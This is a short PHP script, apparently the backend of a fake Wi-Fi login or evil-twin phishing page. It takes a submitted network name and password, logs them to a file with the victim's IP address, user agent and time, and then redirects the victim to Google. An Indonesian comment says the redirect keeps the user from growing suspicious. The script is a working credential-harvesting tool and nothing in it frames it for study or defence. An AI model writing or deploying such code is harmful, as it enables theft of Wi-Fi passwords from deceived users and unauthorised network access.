<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
    $ssid = $_POST['ssid'];
    $pass = $_POST['password'];
    $ip = $_SERVER['REMOTE_ADDR'];
    $ua = $_SERVER['HTTP_USER_AGENT'];
    $time = date('Y-m-d H:i:s');

    $log = "==============================\n";
    $log .= "Time: $time\nIP: $ip\nSSID: $ssid\nPASS: $pass\nUser-Agent: $ua\n";
    $log .= "==============================\n\n";

    file_put_contents("log.txt", $log, FILE_APPEND);
    
    // Redirect ke halaman asli (misal google) agar user tidak curiga
    header("Location: https://www.google.com");
    exit();
}
?>
